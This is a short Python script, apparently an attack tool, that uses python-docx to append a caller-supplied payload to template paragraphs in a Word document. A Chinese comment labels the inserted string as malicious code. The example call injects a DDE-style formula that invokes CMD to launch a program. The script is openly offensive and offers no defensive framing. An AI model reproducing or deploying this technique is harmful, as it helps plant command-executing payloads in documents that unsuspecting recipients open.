from docx import Document

   def template_injection(file_path, malicious_code):
       doc = Document(file_path)
       for paragraph in doc.paragraphs:
           runnable_text = paragraph.text
           if runnable_text.startswith('{{') and runnable_text.endswith('}}'):
               paragraph.text = f'{runnable_text}{malicious_code}'
       doc.save('output.docx')

   # 呼叫程式碼並指定要插入的惡意程式碼
   template_injection('template.docx', '=CMD|\' /C calc\'!A0')